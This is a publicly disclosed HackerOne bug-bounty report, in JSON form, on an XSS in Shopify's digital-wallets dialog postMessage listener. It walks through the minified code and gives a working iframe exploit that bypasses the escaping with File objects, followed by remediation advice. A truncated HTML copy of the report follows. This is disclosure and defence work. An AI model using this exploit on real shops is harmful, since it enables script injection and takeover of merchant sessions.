{"id":231053,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzEwNTM=","url":"https://hackerone.com/reports/231053","title":"XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on \"/:id/digital_wallets/dialog\"","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-05-23T09:55:08.696Z","submitted_at":"2017-05-23T09:55:08.696Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bored-engineer","url":"/bored-engineer","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-30T17:10:05.272Z","bug_reporter_agreed_on_going_public_at":"2017-05-30T17:10:05.220Z","team_member_agreed_on_going_public_at":"2017-05-29T17:26:17.702Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Description\nThe `/:id/digital_wallets/dialog` endpoint is used to display a small dialog box relating to the \"digital wallets\" functionality on a shop. The endpoint includes a script that listens for postMessages without validating the origin of messages. However, the impact of the missing validation is very limited because the script attempts to escape any content to prevent any HTML injection. By sending a specially crafted postMessage containing a \"clone-able\" object (per the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm)) this escaping can be bypassed allowing a malicious actor to obtain XSS. \n\n# Technical Background\nNote: For the sake of clarity I've renamed some of the variables and re-written sections of code to only include the relevant functions from [the minified JavaScript](https://cdn.shopify.com/s/assets/services/digital_wallets/scripts-e4c6841a7e9dfd3216a6cc52da1313648ea3b449f388411eac2f260b3f7f36f6.js) so this report is easier to understand...\nThe [/:id/digital_wallets/dialog](https://bored-engineering-whitehat-2.myshopify.com/1337/digital_wallets/dialog) route initializes a postMessage listener on page load that looks like this:\n```js\nthis._messageHandler = function(event) {\n  if (event.data) {\n    if (event.data.type \u0026\u0026 event.data.digitalWalletsDialog) {\n      c(i, event.data.type, event.data.payload);\n    }\n  }\n}\nthis._localWindow.addEventListener(\"message\", this._messageHandler)\n```\nThe `c` function which handles the message is responsible for a few different message types, in this case we're only interested in the `DigitalWalletsDialog:change` type:\n```js\nfunction c(inst, type, payload) {\n  switch (type) {\n    case ze.DIALOG_CHANGE: // DigitalWalletsDialog:change\n      if (d(payload)) { // Check that the required fields are present\n        g(inst) // Reset the DOM\n        p(inst, payload) // Insert the payload into the DOM\n...\n```\nAs noted in my previous comments the `d` function and `g` function are relatively straightforward and un-interesting:\n```js\nfunction d(payload) {\n  var required = [\"title\", \"button\"]\n  for (var idx = 0; idx \u003c required.length; idx++)\n    if (!payload[required[idx]] || \"\" === !payload[required[idx]]) {\n      return false\n    }\n    return true\n}\nfunction g(inst) {\n  for (var idx in inst.customizableElements) {\n    inst.customizableElements[idx].innerHTML = \"\"\n    inst.customizableElements[idx].classList.remove(\"hidden\")\n  }\n  inst.customizableElements.errorList.scrollTop = 0\n}\n```\nUnderstanding all of the previous pieces, we can pass a legitimate message through the functions like so:\n```js\nwindow.postMessage({\n  type: \"DigitalWalletsDialog:change\",\n  digitalWalletsDialog: true,\n  payload: {\n    title: \"placeholder\",\n    button: \"placeholder\"\n  },\n}, \"*\");\n```\nAnd when we do the dialog renders as expected:\n{F187323}\nLooking more into the `p` function we see it is responsible for setting/creating the values for a number of elements on the DOM:\n```js\nfunction p(inst, payload) {\n  _(inst, t.icon)\n  v(inst, \"title\", payload.title)\n  if (payload.errors) {\n    if (Array.isArray(payload.errors)) {\n      if (payload.errors.length \u003e 1) {\n        v(inst, \"errorList\", h(payload.errors))\n        inst.customizableElements.errorDescription.classList.add(\"hidden\")\n        inst.staticElements.errorListContainer.classList.remove(\"hidden\")\n      } else {\n        v(inst, \"errorDescription\", payload.errors[0])\n        inst.staticElements.errorListContainer.classList.add(\"hidden\")\n      }\n    } else { \n      e.customizableElements.errorDescription.classList.add(\"hidden\")\n    }\n  }\n  if (payload.lineItems) {\n    v(inst, \"errorList\", f(payload.lineItems)) \n    inst.staticElements.errorListContainer.classList.remove(\"hidden\")\n    v(inst, \"dismissButton\", payload.button || \"Close\")\n  }\n}\n```\nThe part we're going to focus on is the `payload.lineItems` handling. The items are passed into the `f` function which is defined as follows:\n```js\nfunction f(payload) {\n  var table = document.createElement(\"table\")\n  table.className = \"product-table\"\n  table.id = \"dialog__product-table\"\n  table.innerHTML = T // \u003cthead\u003e\u003ctr\u003e...\n  payload.forEach(function(lineItem) {\n    table.tBodies[0].innerHTML += m(lineItem)\n  })\n  return table\n}\n```\nIt appears that function creates a table for each `lineItem` rendering them with the `m` function:\n```js\nfunction m(payload) {\n  var escaped = u(payload)\n  if (escaped.variant) {\n    return '\\n      \u003cspan class=\"product__description__variant order-summary__small-text\"\u003e\\n        ' + escaped.variant + \"\\n      \u003c/span\u003e\"\n  }\n  return '\\n    \u003ctr class=\"product\"\u003e\\n      \u003ctd class=\"product__image\"\u003e\\n        \u003cdiv class=\"product-thumbnail\"\u003e\\n          \u003cdiv class=\"product-thumbnail__wrapper\"\u003e\\n            \u003cimg alt=\"' + t.name + '\" class=\"product-thumbnail__image\" src=\"' + t.image + '\"\u003e\\n          \u003c/div\u003e\\n          \u003cspan class=\"product-thumbnail__quantity\" aria-hidden=\"true\"\u003e' + t.amount + '\u003c/span\u003e\\n        \u003c/div\u003e\\n      \u003c/td\u003e\\n      \u003ctd class=\"product__description\"\u003e\\n        \u003cspan class=\"product__description__name order-summary__emphasis\"\u003e' + t.name + \"\u003c/span\u003e\\n        \" + n + '\\n      \u003c/td\u003e\\n      \u003ctd class=\"product__quantity visually-hidden\"\u003e' + t.amount + '\u003c/td\u003e\\n      \u003ctd class=\"product__status product__status--sold-out\"\u003e' + t.message + \"\u003c/td\u003e\\n    \u003c/tr\u003e\\n  \"\n}\n``` \nAnd again we can verify this assumption by testing it:\n```\nwindow.postMessage({\n  type: \"DigitalWalletsDialog:change\",\n  digitalWalletsDialog: true,\n  payload: {\n    title: \"placeholder\",\n    button: \"placeholder\",\n    lineItems: [{\n      name: \"product\",\n      amount: \"$13.37\",\n      message: \"added to cart\"\n    }],\n  },\n}, \"*\");\n```\nAnd we get the expected result:\n{F187326}\n\n# Technical Details\nSo now that we have an idea of how the functions behave under normal usage, lets examine how we can exploit them...\nThe main function we're interested in here is the `u` which handles escaping all attributes on the payload:\n```js\nfunction u(payload) {\n  for (var idx in payload) {\n    if (payload.hasOwnProperty(idx)) {\n      payload[idx] = Ve.escapeHtml(payload[idx]);\n    }\n  }\n  return payload;\n}\n```\nNow if we assume that `escapeHtml` function does not have any issues/bypasses, we can observe something interesting: The function does not create a \"new\" escaped object, instead it over-writes properties of the existing object. This means that if we are able to create an object with a controlled property that does not respond to `hasOwnProperty` it will not be escaped. We can test this locally:\n```js\n// Expected to fail:\nresult = u({\n  message: \"'\\\"\u003cb\u003e\\\\\"\n});\nresult.message // \"\u0026#39;\u0026quot;\u0026lt;b\u0026gt;\\\"\n// Bypassed:\nresult = u(new Error(\"'\\\"\u003cb\u003e\\\\\"));\nresult.message; // \"'\"\u003cb\u003e\\\"\n```\nThis is great, but in practice we're limited to only a few properties that are actually accessed by the HTML template:\n\n* `variant`\n* `name`\n* `image`\n* `message`\n\nAdditionally, we're limited to only objects which can be passed over postMessage, for example we can't use the [Error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error) object which already has a `message` attribute. The list of allowed objects for postMessage is defined as part of the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).\n\nAfter a bit of experimentation with each of them, it looks like the [File](https://developer.mozilla.org/en-US/docs/Web/API/File) object is perfect for this exploit as it has a read-only `name` property which is used by our template. We can test it out like so:\n```js\nlet f = new File([\"data\"], \"controlledvalue\");\nf.name; // \"controlledvalue\"\nf.hasOwnProperty(\"name\"); // false\n```\nPutting this all together with an iframe to make it clean we get the final exploit:\n```js\nlet shop = prompt(\"Enter a Target Shop URL:\", \"https://bored-engineering-whitehat-2.myshopify.com\");\nlet frame = document.createElement(\"iframe\");\nframe.src = `${shop}/1337/digital_wallets/dialog`;\nframe.style.display = \"none\";\nframe.onload = () =\u003e {\n  frame.contentWindow.postMessage({\n    type: \"DigitalWalletsDialog:change\",\n    digitalWalletsDialog: true,\n    payload: {\n      title: \"placeholder\",\n      button: \"placeholder\",\n      lineItems: [new File([\"\"], \"\u003cimg src=xx: onerror=alert(document.domain)\u003e\")],\n    },\n  }, \"*\");\n}\ndocument.body.appendChild(frame);\n```\n\n# Exploitability\nAs shown in the proof of concept below, the exploit can be hidden in an iframe and requires no user interaction what-so-ever. Additionally, it appears to affect every Shopify shop. With that said, the injection occurs within the `/:id/digital_wallets/dialog` route which is not under `/admin`, though at this point in time it would be trivial to escalate that access to the `/admin` route. \n\n# Proof of Concept\nI've hosted a simple PoC at [https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html](https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html).\n\n# Remediation\nThis issue could be fixed either within the `u` function, or by preventing anything except primitives from being passed over the postMessage channel. Typically this is accomplished by running `JSON.parse` on the message, and exiting the handling if parsing fails. ","vulnerability_information_html":"\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eThe \u003ccode\u003e/:id/digital_wallets/dialog\u003c/code\u003e endpoint is used to display a small dialog box relating to the \u0026quot;digital wallets\u0026quot; functionality on a shop. The endpoint includes a script that listens for postMessages without validating the origin of messages. However, the impact of the missing validation is very limited because the script attempts to escape any content to prevent any HTML injection. By sending a specially crafted postMessage containing a \u0026quot;clone-able\u0026quot; object (per the \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWeb_Workers_API%2FStructured_clone_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHTML5 structured clone algorithm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) this escaping can be bypassed allowing a malicious actor to obtain XSS. \u003c/p\u003e\n\n\u003ch1 id=\"technical-background\"\u003eTechnical Background\u003c/h1\u003e\n\n\u003cp\u003eNote: For the sake of clarity I\u0026#39;ve renamed some of the variables and re-written sections of code to only include the relevant functions from \u003ca href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Fassets%2Fservices%2Fdigital_wallets%2Fscripts-e4c6841a7e9dfd3216a6cc52da1313648ea3b449f388411eac2f260b3f7f36f6.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethe minified JavaScript\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e so this report is easier to understand...\u003cbr\u003e\nThe \u003ca href=\"/redirect?url=https%3A%2F%2Fbored-engineering-whitehat-2.myshopify.com%2F1337%2Fdigital_wallets%2Fdialog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/:id/digital_wallets/dialog\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e route initializes a postMessage listener on page load that looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_messageHandler\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edigitalWalletsDialog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_localWindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddEventListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_messageHandler\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003ec\u003c/code\u003e function which handles the message is responsible for a few different message types, in this case we\u0026#39;re only interested in the \u003ccode\u003eDigitalWalletsDialog:change\u003c/code\u003e type:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eswitch\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"nx\"\u003eze\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eDIALOG_CHANGE\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"c1\"\u003e// DigitalWalletsDialog:change\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"c1\"\u003e// Check that the required fields are present\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// Reset the DOM\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// Insert the payload into the DOM\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs noted in my previous comments the \u003ccode\u003ed\u003c/code\u003e function and \u003ccode\u003eg\u003c/code\u003e function are relatively straightforward and un-interesting:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003erequired\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etitle\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ebutton\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eidx\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003eidx\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e]])\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eidx\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecustomizableElements\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecustomizableElements\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecustomizableElements\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003eclassList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003einst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecustomizableElements\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrorList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003escrollTop\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUnderstanding all of the previous pieces, we can pass a legitimate message through the functions like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eDigitalWalletsDialog:change\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003edigitalWalletsDialog\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eplaceholder\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003ebutton\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eplaceholder\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd when we do the dialog renders as expected:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-05-23_at_2.18.44_AM.png\" 